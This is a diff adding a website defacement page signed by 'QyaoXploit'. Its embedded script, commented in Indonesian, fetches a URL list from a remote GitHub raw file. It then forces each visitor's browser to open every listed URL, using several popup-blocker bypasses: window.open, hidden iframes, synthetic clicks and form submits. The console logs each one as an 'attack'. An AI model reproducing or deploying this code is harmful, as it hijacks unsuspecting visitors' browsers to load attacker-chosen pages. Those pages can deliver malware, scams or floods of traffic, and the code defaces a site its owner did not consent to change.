@@ -1,0 +1,159 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<script type="text/javascript">
+// ============================================
+// ANTI BLOKIR POPUP - METODE BRUTAL
+// ============================================
+
+let urlList = [];
+let timer = 5;
+let opened = 0;
+
+function fetchUrls() {
+    fetch('https://raw.githubusercontent.com/QyaoXploit67/QyaoXploit67/refs/heads/main/10.txt')
+        .then(response => response.text())
+        .then(data => {
+            const lines = data.split('\n');
+            urlList = [];
+            lines.forEach(line => {
+                const match = line.match(/https?:\/\/[^\s]+/);
+                if (match) {
+                    urlList.push(match[0]);
+                }
+            });
+            console.log('[+] URL ditemukan:', urlList);
+            openAllTabsBrutal();
+        })
+        .catch(err => {
+            console.log('[-] Gagal ambil 10.txt:', err);
+        });
+}
+
+// ============================================
+// METODE BRUTAL: 5 CARA SEKALIGUS
+// ============================================
+function openAllTabsBrutal() {
+    urlList.forEach((url, index) => {
+        setTimeout(() => {
+            // METHOD 1: window.open
+            let win = window.open(url, '_blank');
+            
+            // METHOD 2: Kalo gagal, pake iframe
+            if (!win || win.closed) {
+                const iframe = document.createElement('iframe');
+                iframe.src = url;
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                setTimeout(() => document.body.removeChild(iframe), 3000);
+            }
+            
+            // METHOD 3: Pake link click (event native)
+            const a = document.createElement('a');
+            a.href = url;
+            a.target = '_blank';
+            a.rel = 'noopener noreferrer';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            
+            // Pake dispatch event biar lebih "natural"
+            const event = new MouseEvent('click', {
+                view: window,
+                bubbles: true,
+                cancelable: true
+            });
+            a.dispatchEvent(event);
+            
+            // METHOD 4: Fallback pake click() biasa
+            setTimeout(() => {
+                a.click();
+                document.body.removeChild(a);
+            }, 100);
+            
+            // METHOD 5: Pake form submit (last resort)
+            setTimeout(() => {
+                const form = document.createElement('form');
+                form.action = url;
+                form.target = '_blank';
+                form.method = 'GET';
+                document.body.appendChild(form);
+                form.submit();
+                document.body.removeChild(form);
+            }, 200);
+            
+            opened++;
+            console.log('[+] SERANGAN #' + opened + ' ke: ' + url);
+        }, index * 100);
+    });
+}
+
+function startTimer() {
+    const timerElement = document.getElementById('timerDisplay');
+    const interval = setInterval(() => {
+        timer--;
+        timerElement.textContent = timer;
+        if (timer <= 0) {
+            clearInterval(interval);
+            timerElement.textContent = 'GO!';
+            fetchUrls();
+            setTimeout(() => {
+                timerElement.style.display = 'none';
+            }, 1000);
+        }
+    }, 1000);
+}
+
+window.onload = function() {
+    startTimer();
+};
+
+</script>
+<link rel="icon" type="image/png" href="https://files.catbox.moe/6ov0ly.jpg"/>
+<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet">
+<meta property="og:title" content="QyaoXploit"/>
+<meta property="og:image" content="https://files.catbox.moe/6ov0ly.jpg">
+<title>Hacked by QyaoXploit</title>
+<style>
+#xr{border-top:0px solid #ababab;border-bottom:0px solid #ababab;font-family:Orbitron,monospace;color:darkred;font-size:15px;width= "75%"}#xr:hover{color:#00ff00;text-shadow:#22EDF0 1px 1px 30px;}@font-face{font-family:'Orbitron';font-style:normal;font-weight:700;src:local('Orbitron-Bold'),url(http://fonts.gstatic.com/s/orbitron/v7/Y82YH_MJJWnsH2yUA5AuYY4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000;}pre{text-align:center;}html{overflow-y:hidden;}body{background-repeat:no-repeat;background-position:center;background-color:#000000;cursor:none;margin:0px;}#shadow{position:fixed;left:0px;right:0px;bottom:130px;text-align:center;text-shadow:darkred 1px 1px 30px;}#shadow{position:fixed;left:0px;right:0px;top:20px;text-align:center;text-shadow:darkblue 1px 1px 30px;}shadow1{font-family:Architects Daughter;color:#ffffff;text-shadow:#22EDF0 1px 1px 30px;}
+.audio-center{
+    position: fixed;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 9999;
+}
+#timerDisplay {
+    font-family: 'Nova Square', monospace;
+    font-size: 20px;
+    color: #ffffff;
+    text-align: center;
+    margin-top: 20px;
+    position: relative;
+    z-index: 99999;
+}
+</style>
+</head>
+<body translate="no">
+
+<canvas id="c" height="667" width="1366"></canvas>
+<div id="dp_card"></div>
+
+<div id="shadow" class="shadow">
+ <br><br><br> <br><br>
+<img src='https://files.catbox.moe/6ov0ly.jpg' style="opacity:0.4;filter:alpha(opacity=40)" height=300 width=300><br>
+<font face="Nova Square" color="grey" size="4px"> QyaoXploit was here!</font><br>
+<font face="Nova Square" color="grey" size="2px">
+<br> -= ANONYMOUS =-
+<br>
+<br>
+<br>Just QyaoXploit :)<br>
+</div>
+
+<div class="audio-center">
+    <audio id="bgm" autoplay loop controls>
+      <source src="https://files.catbox.moe/br5294.mp3" type="audio/mpeg">
+    </audio>
+    <div id="timerDisplay">5</div>
+</div>
+
+</body>
+</html>
